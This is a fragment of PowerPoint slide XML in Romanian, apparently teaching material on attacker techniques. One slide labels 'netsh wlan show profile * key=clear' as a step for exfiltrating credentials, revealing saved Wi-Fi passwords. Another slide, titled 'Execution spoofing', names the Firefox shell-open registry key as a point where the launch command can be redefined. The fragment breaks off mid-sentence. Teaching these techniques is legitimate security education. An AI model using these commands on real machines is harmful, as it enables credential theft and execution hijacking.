                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1927387-1048-50E8-882C-C8ECE4F277C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="4213484" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Arrow: Left 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24CC105B-E572-1A12-6A84-23DF57EDAF1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2235200" y="4895850"/>
            <a:ext cx="1978283" cy="654050"/>
          </a:xfrm>
          <a:prstGeom prst="leftArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 7621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Parola wi-fi</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Arrow: Left 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10E64C21-28A4-BA62-E72B-5A42211AFE2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4433208" y="6324599"/>
            <a:ext cx="7542892" cy="460621"/>
          </a:xfrm>
          <a:prstGeom prst="leftArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 102212"/>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err="1"/>
              <a:t>Exfiltrare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>credentiale</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Arrow: Left 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{027DFF0E-0E4F-4E6D-1D37-DEFCC2FD25E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3822698" y="72780"/>
            <a:ext cx="8369302" cy="511420"/>
          </a:xfrm>
          <a:prstGeom prst="leftArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 7621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err="1"/>
              <a:t>netsh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>wlan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> show profile * key=clear</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Flowchart: Process 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28224613-4A83-F89C-D68B-8867918FF234}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="51252" y="359084"/>
            <a:ext cx="3365048" cy="22511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17" name="Flowchart: Process 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9001EDD-F0F3-639C-A5BA-07F0B05BFF73}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4433207" y="2737757"/>
            <a:ext cx="7542892" cy="348297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18" name="Flowchart: Process 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{62684937-FDFE-B183-C312-31FFC77F332D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4433207" y="1411288"/>
            <a:ext cx="7542892" cy="112498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0" name="TextBox 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5EDC81BD-8775-9A8C-95FF-E913C3A08399}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4213483" y="-31088"/>
            <a:ext cx="7807327" cy="230832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>SSID-ul este </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>numele</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>rețelei</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> Wi-Fi, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>dar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>în</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>comandă</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> nu se </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>scrie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> explicit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>deoarece</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>netsh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>folosește</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> direct </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>numele</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>profilului</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> wireless </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>salvat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>în</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> Windows.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9C5E73D4-DC07-D2F3-48AC-8B12E0C6D87A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9854293" y="2227116"/>
            <a:ext cx="2178050" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SSID (Service Set Identifier) </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1086991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942" y="299131"/>
            <a:ext cx="10515600" cy="774246"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Execution spoofing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1970769"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Calea SOFTWARE\Clients\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>StartMenuInternet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>\FIREFOX.EXE\shell\open\command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>dintr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>-un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>registru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>specifică</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>locația</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>executabilului</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> Firefox pe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sistemul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>respectiv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>În</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>contextul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>registrului</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> Windows, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>această</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> cale </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>este</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>folosită</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>pentru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>defini</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>comanda</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> care </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>va</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> fi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>executată</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>atunci</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>când</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>utilizator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
